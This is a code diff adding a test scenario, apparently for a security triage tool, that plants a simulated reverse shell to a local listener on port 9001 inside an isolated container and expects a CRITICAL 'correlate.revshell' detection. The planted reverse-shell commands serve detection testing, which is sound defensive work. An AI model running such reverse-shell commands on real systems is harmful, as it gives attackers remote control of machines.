@@ -304,6 +304,27 @@ func init() {
 		MustBeComplete: true,
 	})
 
+	Register(Scenario{
+		ID:   "44-wtf-revshell",
+		Desc: "wtf enxerga o que precisa ser enxergado em 1s, e sai com o mesmo código",
+		// O wtf tem seleção, orçamento e renderização próprios. O que NÃO pode
+		// mudar é o contrato: mesmo JSONL, mesmo exit code — é por ele que a
+		// triagem de frota se ordena.
+		Images:    minimal,
+		Cmd:       "wtf",
+		Caps:      []string{"NET_ADMIN"},
+		NoNetwork: true,
+		Plant: `ip link set lo up
+			ip addr add 51.91.190.241/32 dev lo
+			/helper listen 51.91.190.241:9001 &
+			sleep 0.4
+			/helper revshell 51.91.190.241:9001 &
+			sleep 0.5`,
+		Expect:         []Expect{{ID: "correlate.revshell", Sev: "CRITICAL"}},
+		Exit:           2,
+		MustBeComplete: true,
+	})
+
 	// ---------------------------------------------------------------- modo image
 
 	Register(Scenario{
